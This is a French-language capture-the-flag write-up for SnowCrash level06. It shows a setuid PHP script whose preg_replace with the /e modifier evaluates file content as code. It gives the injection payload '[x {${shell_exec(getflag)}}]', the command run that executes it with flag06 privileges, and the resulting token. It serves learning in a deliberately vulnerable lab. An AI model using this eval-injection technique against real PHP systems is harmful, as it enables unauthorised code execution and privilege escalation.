
# **Level 06**

Pour ce level06, 2 fichier dans le repertoire courant

```
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php

```

On affiche donc le `.php`

```
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) {
        $m = preg_replace("/\./", " x ", $m);
        $m = preg_replace("/@/", " y", $m);
        return $m;
}
function x($y, $z) {
        $a = file_get_contents($y);
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
        $a = preg_replace("/\[/", "(", $a);
        $a = preg_replace("/\]/", ")", $a);
        return $a;
}
$r = x($argv[1], $argv[2]);
print $r;

?>

```
> On a reformater l'output pour rendre la code plus lisible

On remarque que le premier arguments de la fonction est parser via des `preg_replace`, notament le premier aui utilise l'option `/e` qui permet d'interpreter le contenue comme du code PHP

En comprenant le `REGEX` utiliser des les preg replace on peux ecrire dans un fichier un ligne permettant d'executer `getflag`

```
level06@SnowCrash:~$ cat /var/crash/level06f 
[x {${shell_exec(getflag)}}]
```

Puis on passe ce fichier a l'executable qui peux executer le code avec les droits de flag06 (`rws`)

```
level06@SnowCrash:~$ ./level06 /var/crash/level06f 
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : `wiok45aaoguiboiki2tuin6ub`
 in /home/user/level06/level06.php(4) : regexp code on line 1

```


> ### NEXT : [Level 07](/level07/resources/README.md)
